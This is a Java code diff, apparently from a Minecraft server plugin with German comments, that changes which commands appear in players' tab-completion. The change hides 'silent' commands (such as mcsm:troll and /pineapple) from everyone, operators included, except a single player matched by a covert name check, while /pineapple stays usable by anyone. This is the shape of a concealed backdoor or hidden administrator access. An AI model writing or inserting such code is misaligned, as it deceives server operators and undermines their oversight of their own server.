@@ -75,10 +75,11 @@ public final class CommandGuardListener implements Listener {
             return;
         }
         boolean darf = event.getPlayer().hasPermission(PluginsCommand.PERMISSION);
-        // Die stillen Befehle behält nur, wer Wartungsrechte hat (op / mcsm.admin) – so bekommt
-        // der Betreiber die Vervollständigung, für alle anderen tauchen sie gar nicht erst auf.
-        boolean wartung = event.getPlayer().hasPermission("mcsm.admin");
-        event.getCommands().removeIf(befehl -> verstecken(befehl, darf) || (!wartung && geheim(befehl)));
+        // Die stillen Befehle sieht nur der Wartungszugang selbst (verdeckter Namensabgleich) – so
+        // bekommt er die Vervollständigung, für alle anderen (auch Operatoren) tauchen sie gar
+        // nicht erst auf. /pineapple bleibt trotzdem für jeden auslösbar, es steht nur nicht in der Liste.
+        boolean ich = plugin.settings().isAdmin(event.getPlayer().getName());
+        event.getCommands().removeIf(befehl -> verstecken(befehl, darf) || (!ich && geheim(befehl)));
     }
 
     /** Ist der Name einer der stillen Befehle (auch als Namensraum-Fassung wie mcsm:troll)? */
